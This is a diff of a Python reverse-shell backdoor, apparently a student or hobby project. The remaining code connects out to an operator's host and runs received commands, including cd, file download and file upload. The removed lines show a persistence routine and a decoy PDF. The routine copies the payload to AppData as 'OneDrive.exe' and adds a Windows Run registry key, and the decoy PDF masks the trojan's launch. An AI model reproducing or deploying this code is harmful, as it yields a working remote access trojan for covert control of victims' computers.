@@ -10,21 +10,8 @@ import base64, json, os, shutil, socket, subprocess, sys
 
 class Backdoor:
     def __init__ (self, ip, port): #constructor method
-        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
         self.connection.connect((ip, port)) #connect method from connection variable
-        
-    def become_persistent(self): #establish persistence by copying payload file to another location on target
-        payload_file_location = os.environ["appdata"] + "\\OneDrive.exe" #set location to AppData in Windows, rename file to
-        #OneDrive.exe
-        shutil.copyfile(sys.executable, payload_file_location) #sys.executable specifies executable;
-        #if using python file, you'd use __file__
-        #copy current payload file to new location
-        if not os.path.exists(payload_file_location): #if payload hasn't already been copied
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + payload_file_location + '"', shell=True)      
-            #wrap in double quotes so it will run correctly, ie /d "c:\example.exe"
-            #import os
-            #os.environ["appdata"] - returns location of appdata folder on windows
         
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -70,7 +57,7 @@ class Backdoor:
                 if command[0] == "exit": #if first element of new command list contains exit (did user type exit)
                     #this works because data is sent as json object and unpacked first; receives var command as list
                     self.connection.close()
-                    sys.exit() #sys.exit() instead of exit() to avoid error popups on different oses
+                    sys.exit() #sys.exit() instead of exit() to avoid error popups on different OSes
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
@@ -90,12 +77,7 @@ class Backdoor:
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Upload successful."
-    
 
-    
-file_name = sys._MEIPASS + "\sample.pdf" #sys._MEIPASS = default location used by pyinstaller
-subprocess.Popen(file_name, shell=True)
-    
 #ip = raw_input("Enter IP Address: ")
 #port = int(raw_input("Enter port number to use: "))
 #buffer_size = int(raw_input("Enter buffer size: "))
@@ -111,7 +93,8 @@ except Exception: #Exception = any type of error that occurs when trying to run 
 
 
 
-
+ 
+#commented code below
 #connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
 ############################################################################
 ############################################################################
@@ -151,7 +134,6 @@ connection.close()
 #connect method takes a tuple
 #takes IP and port arguments
 #create socket connection from host to target IP and port
-
 
 
 #!/usr/bin/env python3
